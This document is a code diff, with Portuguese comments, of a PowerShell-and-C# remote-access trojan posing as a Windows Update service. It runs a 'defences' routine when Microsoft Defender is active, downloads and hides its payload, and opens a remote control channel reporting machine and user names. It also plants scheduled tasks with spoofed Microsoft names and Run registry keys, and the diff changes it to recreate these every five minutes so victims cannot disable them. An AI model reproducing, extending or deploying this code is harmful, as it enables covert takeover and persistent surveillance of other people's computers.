@@ -10,10 +10,8 @@ $h = [System.BitConverter]::ToString(
         [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
 $installName  = "WinUpdateSvc_$h"
 $taskName     = "MicrosoftWindowsUpdateService_$h"
-$taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $shadowName   = "MicrosoftCompatibilityAppraiser_$h"
-$shadowPath   = "\Microsoft\Windows\Application Experience\$shadowName"
-$mutexName    = "Local\WinUpdateSvcMutex_$h"
+$mutexName    = "Global\WinUpdateSvcMutex_$h" # ALTERADO PARA GLOBAL
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -25,7 +23,6 @@ if (-not $isAdmin) {
 $dir = "$env:ProgramData\Microsoft\Windows\Caches\$h"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
-$bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
     # 1. Deteta estado do Defender
@@ -35,7 +32,7 @@ if ($args -notcontains "-silent") {
         if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
     } catch { }
 
-    # 2. Defesas — só se o Defender estiver ativo
+    # 2. Defesas
     if (-not $defenderOff) {
         $sd = "$env:TEMP\sd_$h"
         New-Item -ItemType Directory -Path $sd -Force -ErrorAction SilentlyContinue | Out-Null
@@ -61,24 +58,12 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
-    # 3. Instalação e Persistência
+    # 3. Instalação e Persistência Base
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
     $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
     Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
-
-    $bootContent = @"
-`$userTask = "$taskName"
-while (`$true) {
-    try {
-        `$active = (query session 2>`$null | Select-String "Active")
-        if (`$active) { schtasks /run /tn `$userTask 2>`$null | Out-Null }
-    } catch {}
-    Start-Sleep -Seconds 30
-}
-"@
-    Set-Content -Path $bootPath -Value $bootContent -Force -ErrorAction SilentlyContinue
 
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     try {
@@ -91,7 +76,7 @@ while (`$true) {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 4. Persistência via schtasks.exe + XML
+    # 4. Persistência via schtasks.exe (Logon + TimeTrigger blindado)
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
@@ -103,7 +88,8 @@ while (`$true) {
     <LogonTrigger><Enabled>true</Enabled><UserId>$env:USERNAME</UserId></LogonTrigger>
     <TimeTrigger><StartBoundary>$startTime</StartBoundary>
       <Repetition><Interval>PT${interval}M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
-      <Enabled>true</Enabled></TimeTrigger>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
   </Triggers>
   <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
   <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled></Settings>
@@ -117,7 +103,6 @@ while (`$true) {
 
     attrib +h +s +r $scriptPath 2>$null
     attrib +h +s +r $vbsPath 2>$null
-    attrib +h +s +r $bootPath 2>$null
 
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit
@@ -274,7 +259,6 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
                     
-                    // AQUI ENVIA O NOME DO PC
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
                     
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
@@ -341,7 +325,7 @@ if (-not ("R9KAgent" -as [type])) {
                         string leaf = sub.Substring(sub.Length - 8);
                         string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
                         string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
-                        string bootPath = Path.Combine(sub, "boot_launcher.ps1");
+                        
                         if (!File.Exists(scriptPath)) {
                             string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                             try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
@@ -352,57 +336,42 @@ if (-not ("R9KAgent" -as [type])) {
                             try { File.WriteAllText(vbsPath, vbs); } catch {}
                             try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
                         }
-                        if (!File.Exists(bootPath)) {
-                            string b = "$userTask = \"MicrosoftWindowsUpdateService_" + leaf + "\"\nwhile ($true) { try { $a = (query session 2>$null | Select-String \"Active\"); if ($a) { schtasks /run /tn $userTask 2>$null | Out-Null } } catch {}; Start-Sleep -Seconds 30 }";
-                            try { File.WriteAllText(bootPath, b); } catch {}
-                            try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
-                        }
+                        
                         string tUser = "MicrosoftWindowsUpdateService_" + leaf;
-                        string tBoot = "MicrosoftWindowsUpdateBoot_" + leaf;
                         string tShadow = "\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf;
-                        if (!TaskExists(tUser)) { CreateTaskFromXml(tUser, TaskXml(scriptPath, vbsPath, false), sub); }
-                        if (!TaskExists(tBoot)) { CreateTaskFromXml(tBoot, TaskXml(scriptPath, bootPath, true), sub); }
-                        if (!TaskExists(tShadow)) { CreateTaskFromXml(tShadow, TaskXml(scriptPath, vbsPath, false), sub); }
+                        
+                        // Força a recriação das tarefas a cada 5 minutos para garantir que nunca sejam desativadas
+                        try { CreateTaskFromXml(tUser, TaskXml(scriptPath, vbsPath), sub); } catch {}
+                        try { CreateTaskFromXml(tShadow, TaskXml(scriptPath, vbsPath), sub); } catch {}
+                        
                         using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
+                            if (rk != null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
                         }
                         using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
+                            if (rk != null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
                         }
                     }
                 } catch {}
-                Thread.Sleep(30000);
+                Thread.Sleep(300000); // 5 minutos
             }
         }
 
-        static bool TaskExists(string name) {
-            try {
-                var p = Process.Start(new ProcessStartInfo("schtasks", "/query /tn \"" + name + "\"") { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true });
-                p.WaitForExit(5000);
-                return p.ExitCode == 0;
-            } catch { return false; }
-        }
-
-        static string TaskXml(string scriptPath, string execPath, bool boot) {
-            string principal = boot ? "<UserId>S-1-5-18</UserId>" : "<UserId>" + Environment.UserName + "</UserId><LogonType>InteractiveToken</LogonType>";
-            string triggers = boot
-                ? "<BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger>"
-                : "<LogonTrigger><Enabled>true</Enabled><UserId>" + Environment.UserName + "</UserId></LogonTrigger>" +
-                  "<TimeTrigger><StartBoundary>" + DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss") + "</StartBoundary>" +
-                  "<Repetition><Interval>PT1M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></TimeTrigger>";
-            string cmd = boot ? "powershell.exe" : "wscript.exe";
-            string args = boot ? "-nop -w hidden -ep bypass -f \"" + execPath + "\"" : "//B //Nologo \"" + execPath + "\"";
+        static string TaskXml(string scriptPath, string execPath) {
+            string triggers = "<LogonTrigger><Enabled>true</Enabled><UserId>" + Environment.UserName + "</UserId></LogonTrigger>" +
+                              "<TimeTrigger><StartBoundary>" + DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss") + "</StartBoundary>" +
+                              "<Repetition><Interval>PT1M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>" +
+                              "<Enabled>true</Enabled></TimeTrigger>";
             return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                 "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                 "<RegistrationInfo><Description>Microsoft Windows Update</Description></RegistrationInfo>" +
                 "<Triggers>" + triggers + "</Triggers>" +
-                "<Principals><Principal id=\"Author\">" + principal + "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
+                "<Principals><Principal id=\"Author\"><UserId>" + Environment.UserName + "</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
                 "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
                 "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
                 "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
                 "<StartWhenAvailable>true</StartWhenAvailable>" +
                 "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled></Settings>" +
-                "<Actions Context=\"Author\"><Exec><Command>" + cmd + "</Command><Arguments>" + args + "</Arguments></Exec></Actions></Task>";
+                "<Actions Context=\"Author\"><Exec><Command>wscript.exe</Command><Arguments>//B //Nologo \"" + execPath + "\"</Arguments></Exec></Actions></Task>";
         }
 
         static void CreateTaskFromXml(string name, string xml, string dir) {
@@ -676,7 +645,6 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "shutdown") { lock (writeLock) { myWriter.WriteLine("SHUTTING_DOWN"); } Thread.Sleep(200); Process.Start("shutdown", "/s /f /t 0"); return; }
                 if (cmd == "logoff")   { lock (writeLock) { myWriter.WriteLine("LOGGING_OFF"); } Thread.Sleep(200); Process.Start("shutdown", "/l /f"); return; }
 
-                // NOVO: Comando para forçar atualização / reinstall
                 if (cmd == "reinstall" || cmd == "update") {
                     try {
                         string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
@@ -696,7 +664,7 @@ if (-not ("R9KAgent" -as [type])) {
                         }
                     } catch {}
                     Thread.Sleep(500);
-                    Environment.Exit(0); // Mata a instância atual para a nova assumir
+                    Environment.Exit(0);
                     return;
                 }
 
@@ -745,7 +713,6 @@ if (-not ("R9KAgent" -as [type])) {
                             try { using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                             try { using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                             try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService_" + leaf + " /f").WaitForExit(); } catch {}
-                            try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateBoot_" + leaf + " /f").WaitForExit(); } catch {}
                             try { Process.Start("schtasks", "/delete /tn \"\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf + "\" /f").WaitForExit(); } catch {}
                             string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                             string sv = Path.Combine(startup, runName + ".vbs");
